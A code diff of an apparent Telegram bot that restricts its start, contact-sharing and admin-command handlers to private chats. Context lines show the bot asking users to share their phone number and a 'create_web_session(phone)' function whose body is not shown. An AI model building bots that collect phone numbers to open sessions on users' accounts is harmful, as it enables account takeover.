@@ -41,7 +41,7 @@ def create_web_session(phone):
     return None
 
 
-@bot.on_message(filters.command("start"))
+@bot.on_message(filters.command("start") & filters.private)
 async def start_handler(client, message):
     keyboard = ReplyKeyboardMarkup(
         [[KeyboardButton("📱 Share Phone Number", request_contact=True)]],
@@ -57,7 +57,7 @@ async def start_handler(client, message):
     )
 
 
-@bot.on_message(filters.contact)
+@bot.on_message(filters.contact & filters.private)
 async def contact_handler(client, message):
     try:
         contact = message.contact
@@ -120,7 +120,6 @@ async def contact_handler(client, message):
         try:
             await status.edit_text(caption, reply_markup=keyboard)
         except Exception:
-            # Only send a second message if edit really failed
             try:
                 await status.delete()
             except Exception:
@@ -133,7 +132,7 @@ async def contact_handler(client, message):
             f"❌ Error: {str(e)}\n\nPlease try again or contact support.")
 
 
-@bot.on_message(filters.command("admin"))
+@bot.on_message(filters.command("admin") & filters.private)
 async def admin_handler(client, message):
     if not is_admin(message.from_user.id):
         await message.reply_text("⛔ <b>Access Denied!</b>\n\nYou are not authorized.")
@@ -154,7 +153,7 @@ async def admin_handler(client, message):
     )
 
 
-@bot.on_message(filters.command("addadmin"))
+@bot.on_message(filters.command("addadmin") & filters.private)
 async def add_admin_handler(client, message):
     if not is_admin(message.from_user.id):
         await message.reply_text("⛔ You are not authorized!")
@@ -173,7 +172,7 @@ async def add_admin_handler(client, message):
             "❌ <b>Usage:</b> <code>/addadmin USER_ID</code>")
 
 
-@bot.on_message(filters.command("removeadmin"))
+@bot.on_message(filters.command("removeadmin") & filters.private)
 async def remove_admin_handler(client, message):
     if not is_admin(message.from_user.id):
         await message.reply_text("⛔ You are not authorized!")
@@ -191,7 +190,7 @@ async def remove_admin_handler(client, message):
             "❌ <b>Usage:</b> <code>/removeadmin USER_ID</code>")
 
 
-@bot.on_message(filters.command("admins"))
+@bot.on_message(filters.command("admins") & filters.private)
 async def list_admins_handler(client, message):
     if not is_admin(message.from_user.id):
         await message.reply_text("⛔ You are not authorized!")
